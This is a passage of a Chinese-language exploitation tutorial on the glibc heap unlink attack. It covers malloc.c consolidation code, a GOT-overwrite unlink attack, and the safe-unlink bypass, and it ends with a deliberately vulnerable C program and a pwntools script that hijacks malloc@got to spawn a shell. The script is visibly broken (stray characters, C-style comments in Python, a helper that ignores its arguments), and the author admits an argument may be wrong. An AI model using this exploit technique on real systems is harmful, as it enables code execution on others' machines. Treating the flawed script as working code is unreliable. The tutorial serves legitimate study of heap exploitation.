//后面又是一顿操作，把合并的chunk给放到新的bin里面}</code></pre>10.我们说一下如何利用：</li></ol><ul><li>如果有heap overflow可以覆盖到某一个chunk q 的prev_size. 那么free q 时传入unlink（p）的 p 就可以控制</li><li>使得chunk p的内容可以被控制</li><li>FD = P -&gt; fd ; BK = P -&gt; bk ;  我们可以使得 PK = P -&gt; fd = <a href="mailto:free@got.plt" target="_blank" rel="noopener">free@got.plt</a> - 0x18 （这就是的PK的bk处被写成了<a href="mailto:free@got.plt" target="_blank" rel="noopener">free@got.plt</a>） , BK = P -&gt; bk = shellcode ,那么free @got.plt就会被写入成为shellcode</li><li>但是，BK-&gt;fd = FD 那么你之前写入的shellcode的第16个bit开始会被改成 <a href="mailto:free@got.plt" target="_blank" rel="noopener">free@got.plt</a> - 0x18  ，针对这个其实我们就可以开头插入一个jmp去跳过它</li></ul><p>一个实验用的（这里是32位的，大致跟64位利用相同）</p><pre><code>#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main( int argc, char * argv[] ){        char * first, * second;/*[1]*/ first = malloc( 666 );/*[2]*/ second = malloc( 12 );        if(argc!=1)/*[3]*/         strcpy( first, argv[1] );/*[4]*/ free( first );/*[5]*/ free( second );/*[6]*/ return( 0 );}</code></pre><p>在所有的malloc执行完之后：<br><img src="/2019/08/02/glibc-heap-unlink-lou-dong/1.png" title="This is an image"><br>unlink源码分析：</p><p>先后合并（把当前chunk的前一个chunk和当前chunk合并）</p><pre><code>#!c  /*这个unlink函数实际上是很长的，我下面截取关键部分    /*malloc.c  int_free函数中*//* consolidate backward */    if (!prev_inuse(p)) {      prevsize = p-&gt;prev_size;size += prevsize;      p = chunk_at_offset(p, -((long) prevsize));      unlink(p, bck, fwd);}   /*这一部分前面讲过了*///相关函数说明：/* Treat space at ptr + offset as a chunk */#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))/*unlink操作的实质就是：将P所指向的chunk从双向链表中移除，这里BK与FD用作临时变量*/#define unlink(P, BK, FD) {                                            \    FD = P-&gt;fd;                                   //我们看这里，此时的P其实指向的当前要free的chunk的前一个chunk了，它还在bin里面，我们首先要把它从bin里面拿出来    BK = P-&gt;bk;                                       FD-&gt;bk = BK;                                      BK-&gt;fd = FD;                                  //这几部下来就把chunk拿出来了（其实就是拿出来，然后前后连起来）    ...     //后面又是一顿操作，把合并的chunk给放到新的bin里面}</code></pre><p>malloc第一个chunk的prev_inuse标志一直都是1 虽然它事实上不存在<br>向前合并（forward） ：<br>检查next chunk是否处于free状态，我们回去检查next next chunk的prev_inuse标志位是否为1，下面是源码：</p><pre><code>#!c……/*这里p指向当前chunk*/nextchunk = chunk_at_offset(p, size);……nextsize = chunksize(nextchunk);……if (nextchunk != av-&gt;top) {      /* get and clear inuse bit */      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);//判断nextchunk是否为free chunk      /* consolidate forward */      if (!nextinuse) { //next chunk为free chunk            unlink(nextchunk, bck, fwd); //将nextchunk从链表中移除          size += nextsize; // p还是指向当前chunk只是当前chunk的size扩大了，这就是向前合并！      } else            clear_inuse_bit_at_offset(nextchunk, 0);          ……    }</code></pre><p>在这个例子中next next chunk 就是top chunk，那么top chunk 的prev_inuse始终为1 ，所以也不会进行向前合并，但是我们可以利用堆溢出伪造，不过，我们还要了解一下合并后或者不满足条件没合并的chunk会怎么办：glibc malloc中会把他们放到unsorted bin之中</p><pre><code>#!c/*Place the chunk in unsorted chunk list. Chunks are not placed into regular bins until after they have been given one chance to be used in malloc.*/  bck = unsorted_chunks(av); //获取unsorted bin的第一个chunk/*  /* The otherwise unindexable 1-bin is used to hold unsorted chunks. */    #define unsorted_chunks(M)          (bin_at (M, 1))*/      fwd = bck-&gt;fd;      ……      p-&gt;fd = fwd;      p-&gt;bk = bck;      if (!in_smallbin_range(size))        {          p-&gt;fd_nextsize = NULL;          p-&gt;bk_nextsize = NULL;        }      bck-&gt;fd = p;      fwd-&gt;bk = p;        set_head(p, size | PREV_INUSE);//设置当前chunk的size,并将前一个chunk标记为已使用set_foot(p, size);//将后一个chunk的prev_size设置为当前chunk的size/*   /* Set size/use field */   #define set_head(p, s)       ((p)-&gt;size = (s))   /* Set size at footer (only when chunk is not in use) */   #define set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;prev_size = (s))*/</code></pre><p>上面基本就是说，free后的chunk插入到unsorted chunk的第一个chunk(这个其实是bin)与下一个chunk（这个才是真正可用的第一个chunk）的中间当做表头，然后通过设置自己的size字段来表示前一个chunk可用，然后更改next chunk的prev_size为改chunk的大小，<br>但是本例中的chunk second没被放入unsort bin，而是放入了fastbin.<br>下面我们可以精心布置chunk second来实现攻击：<br>1.我们要修改chunk second 的chunk header</p><ul><li>任意数</li><li>size = -4  -4 = 11111100  //这个主要是控制prev_inuse 位</li><li>fd = free函数的got表地址-12</li><li>bk = shellcode的地址</li></ul><p>这样程序在继续运行得话如果free(first) , 我们要考虑是否合并，首先肯定不会向后合并，那就考虑向后合并，glibc通过chunk second 的size + chunk second 的prev_size 来确定next next chunk，那么现在size是-4，那么现在next_chunk，被当做next next chunk，因为size = -4所以next_chunk被当做free的，然后出发unlink，进行合并操作，</p><pre><code>BK=second-&gt;bk（在例子中bk实际上是shellcode的地址）FD=second-&gt;fd (在例子中fd实际上是free@got的地址 - 12)FD-&gt;bk=BK/*shellcode被写进了FD+12的位置，但是FD是free@got的地址-12，所以实际上我们已经把shellcode地址写入了free@got*/BK-&gt;fd=FD</code></pre><p>可是新的glibc增加了保护机制防止unlink,但是仍然可以绕过，下面同用于64和32位,但是例子是64位的：<br>检查源码：</p><pre><code>#define unlink(P, BK, FD) {                                                FD = P-&gt;fd;                             BK = P-&gt;bk;       if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))       //具体就是说在进行unlink操作之前，会先检查当前chunk的prev_chunk的fd和next_chunk的bk是不是当前chunk。            malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P);                                      FD-&gt;bk = BK;                                      BK-&gt;fd = FD;                                   ...     }</code></pre><p>overwrite Heap Pointer 利用条件:</p><ul><li>有一个指针指向heap</li><li>存放改指针的地址已知（比如改指针是全局变量）</li><li>可以对改指针多次写入 </li></ul><p>那么我们就可以构造下面来越过检查：</p><ul><li>p -&gt; fd = &amp;p - 0x18</li><li>p -&gt; bk = &amp;p - 0x10</li><li>接着源码继续进行 ， FD -&gt; bk = BK ; BK - &gt; fd = FD; </li><li>上述完成后我们得到的结果是 ： p = &amp;p - 0x18 </li></ul><p>引入一个例题（这个例题可以用来解释，但是实际操作的时候呢，程序会因为stdout,stdin，生成chunk 夹在中间，使得程序利用难以实现），不过重要的是思路：</p><pre><code>#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#include&lt;unistd.h&gt;char *cmd;void sh(char *c){    system(c);}int main(){    char *ptr[8];    int size;    int n;    setvbuf(stdout,0,_IONBF,0);    memset(ptr,0,sizeof(ptr));    cmd = malloc(128);    //这里有一个地址已知的全局变量指针，还指向了heap , 而且下面的fgets可以实现对改指针的多次写入    while(1)    {        fgets(cmd,128,stdin);        if(!strncmp(cmd,&quot;add&quot;,3))        {            printf(&quot;Index: &quot;);            scanf(&quot;%d&quot;,&amp;n);            if(n&gt;=0 &amp;&amp; n&lt;8)            {                printf(&quot;Size: &quot;);                scanf(&quot;%d%*c&quot;,&amp;size);                ptr[n] = malloc(size);                printf(&quot;Data: &quot;);                gets(ptr[n]);            }            else            {                puts(&quot;out of bound&quot;);            }        }        else if(!strncmp(cmd,&quot;renove&quot;,6))        {            printf(&quot;Index: &quot;);            scanf(&quot;%d%*c&quot;,&amp;n);            if(n&gt;=0 &amp;&amp; n&lt;8 &amp;&amp; ptr[n])            {                puts(ptr[n]);                free(ptr[n]);                ptr[n] = 0;            }            else            {                puts(&quot;nothing here&quot;);            }        }        else        {            puts(&quot;unkonw command&quot;);        }    }    return 0;}</code></pre><p>下面我们先给出脚本来方便分析</p><pre><code>#coding:utf-8from pwn import *context.log_level = &quot;debug&quot;r = remote(&#39;0.0.0.0&#39;,4000)#r = process(&#39;./unlink2&#39;)elf = ELF(&#39;unlink3&#39;)malloc_got = elf.got[&#39;malloc&#39;]sh_addr = 0x0000000004008A9def malloc(idx,size,data):    r.sendline(&#39;add&#39; + &#39;0&#39;*5 + p64(0x100) + p64(0x0000000006010B0-0x18)+p64(0x0000000006010B0-0x10))    3这里就在于构造FD的fd 和 bk 用于躲过检查    r.sendline(str(idx))    r.sendline(str(size))    r.sendline(str(data))def free(idx):    r.sendline(&#39;renove&#39;)    r.sendline(str(idx))malloc(0,130,&#39;aaaaaaaa&#39;)malloc(1,130,&#39;bbbbbbbb&#39;)free(0)malloc(2,130, 0x80 * &#39;a&#39; + p64(0x1120) + p64(0x90))  #利用heap overflow 改变下一个chunk的prev_size 和 sizefree(1)   #之后&amp;cmd = 0x0000000006010B0 - 0x18 ,这里要注意的是不是free(2),因为上一步改了size位，所以2相当于还是free着呢，所以free(2),会触碰double free检查payload1 = &#39;a&#39; * 0x18 + p64(malloc_got)  //这是的cmd指针 已经被修改了 ， 我们通过fget 可以使得cmd 再次被改为 malloc@got.pltr.sendline(payload1)payload2 = p64(sh_addr) + &#39;;/bin/sh\x00&#39;   //这里就是构造sh函数  ， 可能参数写错了  r.sendline(payload2)r.interactive()</code></pre>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
